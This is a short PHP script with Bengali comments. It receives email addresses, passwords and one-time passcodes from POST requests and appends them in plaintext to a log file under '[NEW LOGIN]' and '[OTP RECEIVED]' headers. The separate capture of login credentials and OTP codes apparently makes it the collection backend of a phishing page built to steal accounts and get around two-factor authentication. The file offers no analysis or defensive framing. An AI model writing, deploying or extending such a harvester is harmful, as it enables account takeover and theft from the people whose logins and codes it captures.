<?php
// ডাটা রিসিভ করা
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$otp = $_POST['otp'] ?? '';
$type = $_POST['type'] ?? '';

$file = fopen("log.txt", "a");

if ($type == 'LOGIN_DATA') {
    // যখন ইমেল ও পাসওয়ার্ড আসবে
    $data = "\n[NEW LOGIN]\nEmail: $email\nPassword: $password\n----------------\n";
    fwrite($file, $data);
} 
elseif ($type == 'OTP_DATA') {
    // যখন ওটিপি আসবে
    $data = "[OTP RECEIVED]\nCode: $otp\n----------------\n";
    fwrite($file, $data);
}

fclose($file);
?>
